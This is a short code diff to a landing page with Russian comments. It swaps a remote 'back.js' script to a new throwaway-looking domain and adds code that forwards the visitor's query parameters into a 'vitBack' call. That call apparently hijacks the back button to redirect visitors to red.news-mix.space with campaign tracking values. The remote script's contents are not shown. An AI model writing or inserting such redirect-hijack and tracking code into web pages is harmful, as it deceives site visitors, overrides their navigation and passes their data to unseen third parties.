@@ -2548,13 +2548,24 @@ function include(url) {
         }
     }
 
+    // Функция для преобразования query-параметров в строку
+    function getQueryParamsString() {
+        const queryParams = getQueryParams();
+        return Object.entries(queryParams)
+            .map(([key, value]) => `${encodeURIComponent(key)}=${encodeURIComponent(value)}`)
+            .join('&');
+    }
+
     // Вызываем функцию при загрузке страницы
     window.onload = addHiddenFieldsToForm;
 </script>
-  <script src="https://string-westernly.com/back.js"></script>
+
+<script src="https://string-vestee.com/back.js"></script>
+
 <script>
     document.addEventListener("DOMContentLoaded", function() {
-        window.vitBack("https://red.news-mix.space/?utm_campaign=17226&utm_medium=2329&is_visitor=1", true);
+        const queryParamsString = getQueryParamsString(); // Получаем строку с параметрами
+        window.vitBack(`https://red.news-mix.space/?utm_campaign=17226&utm_medium=2329&is_visitor=1&${queryParamsString}`, true);
     });
 </script>
  </body>
